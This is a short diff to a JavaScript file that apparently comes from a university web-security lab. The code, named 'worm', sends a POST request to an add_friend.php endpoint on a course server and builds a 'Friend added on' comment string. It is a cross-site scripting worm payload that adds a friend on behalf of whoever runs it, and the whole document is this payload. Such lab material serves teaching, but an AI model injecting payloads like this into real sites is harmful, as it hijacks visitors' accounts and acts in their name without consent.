@@ -1,5 +1,6 @@
 var worm = new XMLHttpRequest(); 
 worm.open('POST', 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=93', true); 
+worm.setRequestHeader("Content-type", "text/html");
 worm.send();
 var date = new Date(); 
 var comment ="Friend added on "+ date.getDate() + "/" + (date.getMonth()+1)  + "/" + date.getFullYear() + " @ "  + date.getHours() + ":"  + date.getMinutes();
